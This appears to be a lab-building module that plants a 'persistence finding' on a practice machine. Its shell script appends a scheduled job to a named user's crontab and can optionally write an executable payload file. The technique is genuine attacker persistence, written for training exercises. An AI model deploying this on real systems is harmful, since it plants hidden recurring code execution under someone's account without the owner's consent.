name: crontab-persistence
description: Practice-box persistence finding: appends a job line to a named user's crontab (spool), optionally planting the payload it runs. Idempotent: re-deploy does not duplicate the line. Vars: USERNAME (required), SCHEDULE (required), JOB_COMMAND (required), PAYLOAD_PATH + PAYLOAD_BODY (optional).
script:
#!/bin/sh
set -eu


: "${USERNAME:?USERNAME is required}"
: "${SCHEDULE:?SCHEDULE is required}"
: "${JOB_COMMAND:?JOB_COMMAND is required}"

if [ -n "${PAYLOAD_PATH-}" ]; then
    install -d -m 0755 "$(dirname -- "$PAYLOAD_PATH")"
    printf '#!/bin/sh\n%s\n' "${PAYLOAD_BODY-}" > "$PAYLOAD_PATH"
    chmod 0755 "$PAYLOAD_PATH"
fi

spool=$(mktemp)
crontab -u "$USERNAME" -l > "$spool" 2>/dev/null || : > "$spool"
if ! grep -Fq -- "$JOB_COMMAND" "$spool"; then
    printf '%s %s\n' "$SCHEDULE" "$JOB_COMMAND" >> "$spool"
    crontab -u "$USERNAME" - < "$spool"
fi
rm -f "$spool"
